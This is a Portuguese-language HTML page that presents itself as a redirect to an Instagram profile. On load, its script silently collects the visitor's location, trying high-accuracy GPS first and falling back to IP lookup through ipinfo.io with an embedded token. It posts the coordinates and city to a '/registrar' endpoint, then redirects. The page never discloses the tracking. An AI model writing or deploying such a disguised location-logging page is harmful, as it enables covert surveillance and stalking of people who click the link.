<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Localizando...</title>
    <script>
        function enviarLocalizacao(lat, lon, precisa, city = '', region = '', country = '') {
            fetch('/registrar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat, lon, precisa, city, region, country })
            }).finally(() => {
                window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
            });
        }

        function tentarLocalizacaoPorIP() {
            fetch('https://ipinfo.io/json?token=848013f8df8279')
                .then(res => res.json())
                .then(d => {
                    const [lat, lon] = d.loc.split(',');
                    enviarLocalizacao(
                        parseFloat(lat),
                        parseFloat(lon),
                        false,
                        d.city || '',
                        d.region || '',
                        d.country || ''
                    );
                })
                .catch(() => {
                    // Em caso de erro, ainda redireciona
                    window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
                });
        }

        window.onload = function () {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const { latitude, longitude } = pos.coords;
                        enviarLocalizacao(latitude, longitude, true);
                    },
                    err => {
                        console.warn("GPS falhou ou negado:", err);
                        tentarLocalizacaoPorIP();
                    },
                    { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
                );
            } else {
                tentarLocalizacaoPorIP();
            }
        };
    </script>
</head>
<body>
    <p>Redirecionando para o Instagram...</p>
</body>
</html>
